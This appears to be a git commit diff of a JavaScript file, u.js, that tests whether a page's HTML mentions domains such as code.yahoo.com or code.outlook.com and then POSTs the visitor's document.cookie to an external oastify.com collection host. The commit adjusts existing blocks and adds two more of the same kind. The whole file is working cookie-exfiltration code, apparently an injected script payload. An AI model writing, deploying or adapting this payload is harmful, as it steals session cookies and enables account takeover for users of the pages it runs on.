88f8f453a75b049d916fdd851e1e8e02fdee17dd
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-03 19:37:13 +0330

    Update u.js

--- u.js
+++ u.js
@@ -3,7 +3,7 @@ if(document.body.innerHTML.match(reg) || document.head.innerHTML.match(reg)){
 fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
-body:'reg'+document.cookie
+body:'reg '+document.cookie
 });
 }
 
@@ -12,7 +12,7 @@ if(document.body.innerHTML.match(reg2) || document.head.innerHTML.match(reg2)){
 fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
-body:'reg2'+document.cookie
+body:'reg2 '+document.cookie
 });
 }
 
@@ -22,6 +22,27 @@ if(document.body.innerHTML.match(reg3) || document.head.innerHTML.match(reg3)){
 fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
-body:'reg3'+document.cookie
+body:'reg3 '+document.cookie
 });
 }
+
+
+var reg4=/code\.yahoo.com/ig;
+if(document.body.innerHTML.match(reg4) || document.head.innerHTML.match(reg4)){
+fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:'reg4 '+document.cookie
+});
+}
+
+
+var reg5=/code\.outlook.com/ig;
+if(document.body.innerHTML.match(reg5) || document.head.innerHTML.match(reg5)){
+fetch('https://d0erjq7cxyx9639j9ndmonmk8be22r.oastify.com', {
+method: 'POST',
+mode: 'no-cors',
+body:'reg5 '+document.cookie
+});
+}
+
